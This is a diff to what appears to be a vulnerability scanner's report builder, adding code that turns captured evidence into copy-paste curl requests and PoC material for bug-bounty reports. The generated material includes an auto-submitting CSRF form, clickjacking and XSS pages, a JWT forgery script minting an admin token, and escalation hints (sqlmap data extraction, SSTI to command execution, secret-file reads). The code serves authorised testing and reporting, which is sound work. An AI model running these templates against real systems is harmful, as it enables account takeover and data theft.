@@ -473,20 +473,96 @@ def _deterministic_proof_status(finding: dict[str, Any]) -> str:
     return "missing"
 
 
-def _concrete_repro(finding: dict[str, Any], class_id: str) -> tuple[list[str], str]:
-    """Concrete, copy-pasteable reproduction for classes whose captured evidence lets us
-    write the *exact* request and a runnable demonstration. Returns ``(steps, poc)`` — an
-    empty ``steps`` means "no concrete template; fall back to the generic checklist".
+def _hattr(value: str) -> str:
+    """Escape a value for an HTML attribute in a generated PoC page (URLs carry `&` and
+    occasionally `"`)."""
+    return str(value or "").replace("&", "&amp;").replace('"', "&quot;").replace("<", "&lt;")
 
-    CORS is the driver: a HackerOne triager rejects a CORS report that only shows a
-    reflected header. They want (a) the precise cross-origin request that carries the
-    victim's credentials, (b) the ``Access-Control-Allow-Origin`` / ``-Allow-Credentials``
-    response headers shown as distinct headers, and (c) a PoC page that actually reads the
-    authenticated response cross-origin. We have all three in ``proof_evidence`` here."""
-    pe = finding.get("proof_evidence") if isinstance(finding.get("proof_evidence"), dict) else {}
-    url = str(finding.get("location") or "").strip()
-    if class_id != "cors" or not url.startswith(("http://", "https://")):
-        return [], ""
+
+def _curl_from_evidence(pe: dict[str, Any], url: str) -> tuple[str, str]:
+    """Rebuild the EXACT crafted request GreyIQ used to confirm a finding as a copy-paste
+    curl, from the captured ``proof_evidence``. Returns ``(curl, target_url)`` or ``("","")``
+    when no crafted request line was captured. Every active probe is an idempotent GET/HEAD/
+    OPTIONS, so the reproduction is benign to run as-is."""
+    req_line = str(pe.get("request_line") or "").strip()
+    method, _, target = req_line.partition(" ")
+    target = target.strip()
+    if not target.startswith(("http://", "https://")):
+        return "", ""
+    parts = ["curl -i"]
+    m = method.strip().upper()
+    if m and m != "GET":
+        parts.append(f"-X {m}")
+    req_hdr = str(pe.get("request_header") or "").strip()
+    # Include a LITERAL crafted header (Host / X-Forwarded-Host / Origin); skip placeholder
+    # headers like "Authorization: <forged token>" the operator must construct themselves.
+    if req_hdr and "<" not in req_hdr:
+        parts.append(f"-H {shlex.quote(req_hdr)}")
+    parts.append(shlex.quote(target))
+    return " ".join(parts), target
+
+
+def _html_open_poc(target: str, title: str, lead: str) -> str:
+    """A runnable PoC page that navigates/embeds the crafted URL — for reflected-XSS and
+    open-redirect, where loading the URL in a browser demonstrates the effect."""
+    a = _hattr(target)
+    return (
+        "<!doctype html>\n<meta charset=\"utf-8\">\n"
+        f"<title>{title}</title>\n<p>{lead}</p>\n"
+        f"<p><a href=\"{a}\" target=\"_blank\" rel=\"noopener\">Open the crafted URL</a></p>\n"
+        f"<iframe src=\"{a}\" width=\"760\" height=\"380\" style=\"border:1px solid #ccc\"></iframe>\n"
+    )
+
+
+def _html_csrf_poc(target: str) -> str:
+    a = _hattr(target)
+    return (
+        "<!doctype html>\n<meta charset=\"utf-8\">\n<title>CSRF PoC</title>\n"
+        "<p>Open this page while authenticated to the target; it auto-submits the state-changing "
+        "request cross-site with no anti-CSRF token.</p>\n"
+        f"<form action=\"{a}\" method=\"POST\">\n"
+        "  <input type=\"hidden\" name=\"example_param\" value=\"attacker-controlled\">\n"
+        "  <input type=\"submit\" value=\"Submit the cross-site request\">\n</form>\n"
+        "<script>document.forms[0].submit();</script>\n"
+    )
+
+
+def _html_frame_poc(target: str) -> str:
+    a = _hattr(target)
+    return (
+        "<!doctype html>\n<meta charset=\"utf-8\">\n<title>Clickjacking PoC</title>\n"
+        "<p>The target renders inside this cross-origin frame (no X-Frame-Options / "
+        "frame-ancestors), so an attacker can overlay it and hijack clicks:</p>\n"
+        f"<iframe src=\"{a}\" width=\"820\" height=\"520\" style=\"opacity:0.5\"></iframe>\n"
+    )
+
+
+def _jwt_forge_poc(pe: dict[str, Any]) -> str:
+    """A forged-token PoC from the recovered HMAC secret — the demonstrated impact of a weak
+    JWT secret (arbitrary token forgery / privilege escalation)."""
+    matched = str(pe.get("matched_value") or "")
+    m = re.search(r"recovered:\s*'([^']*)'", matched)
+    alg_m = re.search(r"HMAC-(HS\d+)", matched)
+    secret = m.group(1) if m else "<recovered-secret>"
+    alg = alg_m.group(1) if alg_m else "HS256"
+    return (
+        "# Forge an elevated token with the recovered signing secret, then replay it.\n"
+        "# pip install pyjwt\n"
+        "python - <<'PY'\n"
+        "import jwt\n"
+        f"secret = {json.dumps(secret)}\n"
+        f"forged = jwt.encode({{\"sub\": \"1\", \"role\": \"admin\"}}, secret, algorithm={json.dumps(alg)})\n"
+        "print(forged)\n"
+        "PY\n"
+        "# Replay against an authenticated endpoint; the server accepts your forged token:\n"
+        "# curl -i -H \"Authorization: Bearer <forged>\" '<an authenticated endpoint>'\n"
+    )
+
+
+def _cors_concrete_repro(finding: dict[str, Any], url: str, pe: dict[str, Any]) -> tuple[list[str], str]:
+    """CORS's bespoke reproduction: the precise credentialed cross-origin request, the ACAO /
+    Allow-Credentials headers as distinct headers, and a PoC page that actually reads the
+    authenticated response cross-origin — the three things a HackerOne triager demands."""
     # The exact Origin GreyIQ sent (and the target reflected) — for a subdomain/substring
     # variant this IS a subdomain/host-containing origin, so the repro matches the finding
     # title. Only when a degraded/passive finding carried no captured request header do we
@@ -535,6 +611,106 @@ def _concrete_repro(finding: dict[str, Any], class_id: str) -> tuple[list[str], 
         "</script>\n"
     )
     return steps, poc
+
+
+def _generic_concrete_repro(finding: dict[str, Any], class_id: str, url: str,
+                            pe: dict[str, Any]) -> tuple[list[str], str]:
+    """Concrete reproduction for every OTHER active-confirmed class, rebuilt from the captured
+    crafted request + confirming evidence: the exact request as a copy-paste curl, the observed
+    signal as the demonstration, a class-specific escalation step, and — for the browser-
+    exploitable classes — a runnable PoC page. Returns ``([], "")`` when no crafted request was
+    captured (a passive/degraded finding) so the caller keeps the generic checklist."""
+    curl, target = _curl_from_evidence(pe, url)
+    if not curl:
+        return [], ""
+    matched = str(pe.get("matched_value") or "").strip()
+    status = str(pe.get("response_status") or "").strip()
+    confirm = ("Confirm the response demonstrates the issue"
+               + (f": {matched}" if matched else "")
+               + (f" (observed {status})" if status else "") + ".")
+    steps = [
+        f"Send the exact request GreyIQ used to confirm this — benign and idempotent: `{curl}`",
+        confirm,
+    ]
+    poc = ""
+    rid = str(finding.get("rule_id") or "")
+    if class_id in ("xss", "client_sink"):
+        steps.append("The injected payload is reflected without escaping and runs in the target's origin. "
+                     "Open the crafted URL above in a browser (or the PoC page below) to see it execute.")
+        poc = _html_open_poc(target, "Reflected XSS PoC",
+                             "Loading the crafted URL executes the injected script in the target's origin.")
+    elif class_id == "redirect" and "crlf" in rid:
+        steps.append("The injected CR/LF sequence adds an attacker-controlled header to the response "
+                     "(HTTP response splitting). Escalate to Set-Cookie injection, web-cache poisoning, or "
+                     "reflected XSS carried in the split response.")
+    elif class_id == "redirect" and "host-header" in rid:
+        steps.append("The crafted Host / X-Forwarded-Host is reflected into the response (e.g. into a "
+                     "redirect Location or password-reset link), enabling reset-link poisoning and "
+                     "web-cache poisoning. Point the reflected host at infrastructure you control to "
+                     "demonstrate account takeover.")
+    elif class_id == "redirect":
+        steps.append("Loading the crafted URL redirects the browser to the attacker-controlled host. "
+                     "Open it (or click the link in the PoC page below) to confirm the off-site redirect.")
+        poc = _html_open_poc(target, "Open-redirect PoC",
+                             "Following the crafted URL sends the browser to an attacker-controlled host.")
+    elif class_id == "csrf":
+        steps.append("Host the PoC form below on an origin you control and open it while authenticated to "
+                     "the target; it performs the state-changing request cross-site with no anti-CSRF token.")
+        poc = _html_csrf_poc(target)
+    elif class_id == "headers":
+        steps.append("The page can be framed cross-origin. Host the PoC frame below to demonstrate a "
+                     "clickjacking overlay that hijacks a victim's clicks.")
+        poc = _html_frame_poc(target)
+    elif class_id == "jwt":
+        steps.append("Using the signing secret shown in the evidence, forge a token with elevated claims "
+                     "and replay it — the server accepts your forged token as authenticated (arbitrary "
+                     "token forgery / privilege escalation).")
+        poc = _jwt_forge_poc(pe)
+    elif class_id == "ssti":
+        steps.append("The template engine evaluated the injected expression server-side (7*7 → 49). "
+                     "Escalate to command execution with the engine-specific payload for the detected engine.")
+    elif class_id == "sqli":
+        steps.append("The parameter is injectable. Point sqlmap at this exact request to extract data — "
+                     "e.g. `sqlmap -u '<the request URL above>' -p <param> --batch --dbs` — within scope.")
+    elif class_id in ("path-traversal", "lfi"):
+        steps.append("The response returns the contents of the requested local file. Within scope, target "
+                     "the application's own config/secret files to demonstrate sensitive-file disclosure.")
+    elif class_id == "graphql":
+        steps.append("Introspection returns the full schema. Enumerate types, queries and mutations to map "
+                     "the attack surface and locate unguarded fields (e.g. object access by id).")
+    elif class_id == "nosqli":
+        steps.append("The operator-object payload elicited a NoSQL error, proving the parameter reaches a "
+                     "NoSQL query unsanitized. Escalate with authentication-bypass / extraction operators.")
+    elif class_id == "cloud-exposure":
+        steps.append("The bucket lists anonymously. Enumerate object keys to demonstrate exposure of stored "
+                     "data within scope.")
+    elif class_id == "disclosure":
+        steps.append("The sensitive file/path is served without authentication. Retrieve it and confirm it "
+                     "exposes secrets, source, or config within scope.")
+    return steps, poc
+
+
+def _concrete_repro(finding: dict[str, Any], class_id: str) -> tuple[list[str], str]:
+    """Concrete, copy-pasteable reproduction + a runnable/verifiable PoC for an active-confirmed
+    finding, rebuilt from the exact request/response GreyIQ captured (``proof_evidence``).
+    Returns ``(steps, poc)`` — an empty ``steps`` means "no captured crafted request; fall back
+    to the generic checklist". CORS keeps its bespoke credentialed-read PoC; every other
+    active-confirmed class goes through the generic builder so its report carries the precise
+    reproduction request, the confirming evidence, and (where browser-exploitable) a live PoC —
+    not the old generic `curl -sSiL <url>`."""
+    pe = finding.get("proof_evidence") if isinstance(finding.get("proof_evidence"), dict) else {}
+    url = str(finding.get("location") or "").strip()
+    if not url.startswith(("http://", "https://")):
+        return [], ""
+    if class_id == "cors":
+        return _cors_concrete_repro(finding, url, pe)
+    # The generic per-class reproduction rebuilds the EXACT crafted probe, so it only applies
+    # to an ACTIVE-CONFIRMED finding (rule_id `active.*`). A passive finding (web.*/secret.*)
+    # was observed, not reproduced via a crafted request, so it keeps the generic benign-curl
+    # checklist and its "capture this to prove impact" obligation.
+    if not str(finding.get("rule_id") or "").startswith("active."):
+        return [], ""
+    return _generic_concrete_repro(finding, class_id, url, pe)
 
 
 def _deterministic_attack_plan(finding: dict[str, Any], class_id: str) -> dict[str, Any]:
